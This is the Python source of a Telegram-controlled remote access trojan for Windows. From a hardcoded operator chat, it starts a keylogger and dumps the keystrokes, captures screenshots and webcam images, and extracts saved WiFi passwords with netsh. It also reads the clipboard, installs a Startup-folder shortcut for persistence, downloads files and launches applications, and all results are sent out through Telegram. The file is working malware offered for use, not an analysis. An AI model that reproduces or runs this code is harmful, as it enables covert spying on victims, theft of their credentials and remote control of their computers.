import os
import logging
import subprocess
import requests
import ctypes
import pyautogui
import pyperclip  # For clipboard functionality
import threading  # For handling the keylogger
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler
import cv2
import webbrowser
# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

logger = logging.getLogger(__name__)

# Conversation states
INPUT_TEXT, ALERT_TEXT, WEBSITE_URL, FILE_URL, APP_PATH = range(5)

# Replace with your actual chat ID
ALLOWED_CHAT_ID = 1059393984

# Keylogger variables
keylogger_running = False
logged_keys = []

def keylogger():
    global keylogger_running
    import keyboard  # Make sure to install the `keyboard` library
    keylogger_running = True
    while keylogger_running:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            logged_keys.append(event.name)

def start_keylogger():
    thread = threading.Thread(target=keylogger)
    thread.start()

def stop_keylogger():
    global keylogger_running
    keylogger_running = False

def dump_logged_keys():
    global logged_keys
    return '\n'.join(logged_keys)

async def show_wifi_passwords(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Retrieve and send saved WiFi SSIDs and passwords."""
    wifi_passwords = subprocess.run(
        "netsh wlan show profiles", stdout=subprocess.PIPE, shell=True
    )
    profiles = wifi_passwords.stdout.decode('latin-1').split('\n')

    result = []
    for line in profiles:
        if "All User Profile" in line:
            profile_name = line.split(":")[1].strip()
            wifi_details = subprocess.run(
                f"netsh wlan show profile name=\"{profile_name}\" key=clear",
                stdout=subprocess.PIPE,
                shell=True
            )
            details = wifi_details.stdout.decode('latin-1')
            for detail_line in details.split('\n'):
                if "Key Content" in detail_line:
                    key = detail_line.split(":")[1].strip()
                    result.append(f"SSID: {profile_name}, Key: {key}")

    response = "\n".join(result) if result else "No WiFi passwords found."
    max_length = 4096
    for i in range(0, len(response), max_length):
        await context.bot.send_message(chat_id=update.effective_chat.id, text=response[i:i + max_length])

async def send_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a screenshot to the user."""
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=screenshot_path, caption="Here's your screenshot!")

async def copy_to_clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:    # Fetch the clipboard content
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            await update.message.reply_text(f"Clipboard content: {clipboard_content}")
        else:
            await update.message.reply_text("Clipboard is empty.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred while fetching the clipboard: {str(e)}")

async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle user input for copying to clipboard."""
    user_input = update.message.text
    pyperclip.copy(user_input)
    await update.message.reply_text(f"Copied to clipboard: {user_input}")
    return ConversationHandler.END

async def add_to_startup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Add the bot to startup."""
    bot_path = os.path.abspath(__file__)
    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft\Windows\Start Menu\Programs\Startup', 'MyBot.lnk')
    
    if not os.path.exists(startup_path):
        subprocess.run(['powershell', '-Command', f"$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('{startup_path}'); $s.TargetPath = '{bot_path}'; $s.Save()"])
        await update.message.reply_text("Bot has been added to startup.")
    else:
        await update.message.reply_text("Bot is already in startup.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    user = update.effective_user
    if update.effective_chat.id == ALLOWED_CHAT_ID:
        keyboard = [
            [InlineKeyboardButton("Take Screenshot", callback_data='send_photo'),
             InlineKeyboardButton("Run Shell Commands", callback_data='get_input')],
            [InlineKeyboardButton("Take Camera Snapshot", callback_data='camera_snapshot'),
             InlineKeyboardButton("Show WiFi Passwords", callback_data='wifi_password')],
            [InlineKeyboardButton("Add to Startup", callback_data='add_startup')],
            [InlineKeyboardButton("Show Alert Box", callback_data='show_alert'),
             InlineKeyboardButton("Open Website", callback_data='open_website')],
            [InlineKeyboardButton("Download File", callback_data='download_file'),
             InlineKeyboardButton("Start Application", callback_data='start_application')],
            [InlineKeyboardButton("Copy to Clipboard", callback_data='copy_clipboard'),
             InlineKeyboardButton("Start Keylogger", callback_data='start_keylogger')],
            [InlineKeyboardButton("Stop Keylogger", callback_data='stop_keylogger'),
             InlineKeyboardButton("Dump Keylogger Data", callback_data='dump_keylogger')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_html(
            f"Hi {user.mention_html()}! Choose an option:",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text("Sorry, this bot is not available in this chat.")

async def take_camera_snapshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Take a snapshot using the webcam."""
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        photo_path = "camera_snapshot.jpg"
        cv2.imwrite(photo_path, frame)
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo_path, caption="Here's your camera snapshot!")
    else:
        await update.message.reply_text("Failed to capture a photo.")
    cap.release()

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button presses."""
    query = update.callback_query
    await query.answer()

    if query.data == 'send_photo':
        await send_photo(update, context)
    elif query.data == 'get_input':
        await query.edit_message_text("Please enter some text:")
        return INPUT_TEXT
    elif query.data == 'camera_snapshot':
        await take_camera_snapshot(update, context)
    elif query.data == 'wifi_password':
        await show_wifi_passwords(update, context)
    elif query.data == 'add_startup':
        await add_to_startup(update, context)
    elif query.data == 'show_alert':
        await query.edit_message_text("Please enter the alert text:")
        return ALERT_TEXT
    elif query.data == 'open_website':
        await query.edit_message_text("Please enter the website URL:")
        return WEBSITE_URL
    elif query.data == 'download_file':
        await query.edit_message_text("Please enter the file download URL:")
        return FILE_URL
    elif query.data == 'start_application':
        await query.edit_message_text("Please enter the application path:")
        return APP_PATH
    elif query.data == 'copy_clipboard':
        await copy_to_clipboard(update, context)
    elif query.data == 'start_keylogger':
        start_keylogger()
        await update.message.reply_text("Keylogger started.")
    elif query.data == 'stop_keylogger':
        stop_keylogger()
        await update.message.reply_text("Keylogger stopped.")
    elif query.data == 'dump_keylogger':
        logged_data = dump_logged_keys()
        await update.message.reply_text(f"Logged Keys:\n{logged_data}")

async def show_alert_box(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show an alert box with the provided text."""
    alert_text = update.message.text
    ctypes.windll.user32.MessageBoxW(0, alert_text, "Alert", 1)
    await update.message.reply_text("Alert box displayed.")
    return ConversationHandler.END

async def open_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Open a website based on the user input."""
    website_url = update.message.text
    await update.message.reply_text(f"Opening website: {website_url}")
    webbrowser.open(website_url)
    return ConversationHandler.END

async def download_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Download a file from a URL provided by the user."""
    file_url = update.message.text
    response = requests.get(file_url)
    file_name = os.path.basename(file_url)
    file_path = os.path.join(os.getcwd(), file_name)

    with open(file_path, 'wb') as f:
        f.write(response.content)

    await update.message.reply_text(f"File downloaded: {file_path}")
    return ConversationHandler.END

async def start_application(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start an application provided by the user."""
    app_path = update.message.text
    subprocess.Popen(app_path)
    await update.message.reply_text(f"Application started: {app_path}")
    return ConversationHandler.END
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    await update.message.reply_text("Input cancelled.")
    return ConversationHandler.END

def main() -> None:
    """Start the bot."""
    application = Application.builder().token("your:tokenk").build()

    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(button_callback),
            CommandHandler('start', start)
        ],
        states={
            ALERT_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, show_alert_box)],
            WEBSITE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, open_website)],
            FILE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, download_file)],
            INPUT_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input)],
            APP_PATH: [MessageHandler(filters.TEXT & ~filters.COMMAND, start_application)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
